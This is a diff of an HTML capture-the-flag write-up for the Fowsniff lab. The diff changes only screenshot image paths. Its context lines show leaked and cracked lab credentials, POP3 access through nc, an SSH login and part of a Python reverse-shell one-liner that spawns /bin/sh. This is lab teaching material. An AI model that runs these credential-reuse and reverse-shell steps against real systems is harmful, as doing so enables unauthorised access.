@@ -114,7 +114,7 @@
       <h2>GitHub Leak Discovery</h2>
       <p>Used Google Dorking to find any references to <code>fowsniff</code> on GitHub:</p>
       <pre><code>site:"github.com" "fowsniff"</code></pre>
-      <div class="img-wrap"><img class="screenshot" src="assets/fowsniff/github.png" alt="github search results"></div>
+      <div class="img-wrap"><img class="screenshot" src="assets2/google_fu.png" alt="github search results"></div>
       <p>Found a repository containing usernames and hashed passwords:</p>
       <pre><code>mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
 mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
@@ -127,7 +127,7 @@ sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e</code></pre>
       <h2>POP3 Enumeration & Exploitation</h2>
       <p>Since port 110 (POP3) was open, attempted login using cracked credentials. Metasploit confirmed a valid login:</p>
       <pre><code>seina:scoobydoo2</code></pre>
-      <div class="img-wrap"><img class="screenshot" src="assets/fowsniff/metasploit.png" alt="metasploit pop3 screenshot"></div>
+      <div class="img-wrap"><img class="screenshot" src="assets2/metasploit.png" alt="metasploit pop3 screenshot"></div>
 
       <p>Connected manually using <code>nc</code> to read emails:</p>
       <pre><code>nc 10.10.147.226 110
@@ -144,7 +144,7 @@ RETR 1</code></pre>
       <h2>SSH Access</h2>
       <pre><code>ssh baksteen@10.10.147.226
 Password: S1ck3nBluff+secureshell</code></pre>
-      <div class="img-wrap"><img class="screenshot" src="assets/fowsniff/ssh.png" alt="ssh login screenshot"></div>
+      <div class="img-wrap"><img class="screenshot" src="assets2/ssh.png" alt="ssh login screenshot"></div>
       <p>Gained access as <code>baksteen</code> (non-root). Next, privilege escalation.</p>
     </section>
 
@@ -167,7 +167,7 @@ p=subprocess.call(["/bin/sh","-i"]);'</code></pre>
 
     <section id="root" class="card">
       <h2>Root Shell</h2>
-      <div class="img-wrap"><img class="screenshot" src="assets/fowsniff/root.png" alt="root access screenshot"></div>
+      <div class="img-wrap"><img class="screenshot" src="assets2/root.png" alt="root access screenshot"></div>
       <p>Successfully obtained a root shell and completed the challenge. 🎯</p>
     </section>
 
